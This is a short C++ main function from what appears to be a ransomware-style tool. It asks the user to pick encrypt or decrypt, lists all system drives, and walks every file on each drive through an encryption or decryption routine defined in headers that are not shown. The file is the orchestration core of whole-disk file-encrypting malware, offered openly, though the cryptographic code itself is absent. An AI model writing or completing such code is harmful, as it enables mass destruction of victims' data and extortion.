#include "include/common.h"
#include "include/crypt.h"
#include "include/search.h"

std::string systemDrive[30];

int main() {
	int chs;
	std::cout << "select number to encrypt or decrypt , 1. encrypt , 2. decrypt \n";

	while (true) {
		std::cin >> chs;
		if (chs == 1) {
			getDrive(&systemDrive);
			isCSysDir(&systemDrive);
			for (int i = 0; i < 30; i++) {
				if (systemDrive[i] != "") {
					std::filesystem::path path = systemDrive[i];
					searchInDir(path, true);
				}
			}
		}
		else if (chs == 2) {
			getDrive(&systemDrive);
			isCSysDir(&systemDrive);
			for (int i = 0; i < 30; i++) {
				if (systemDrive[i] != "") {
					std::filesystem::path path = systemDrive[i];
					searchInDir(path, false);
				}
			}
		}
		else {
			break;
		}
	}
	return EXIT_SUCCESS;
}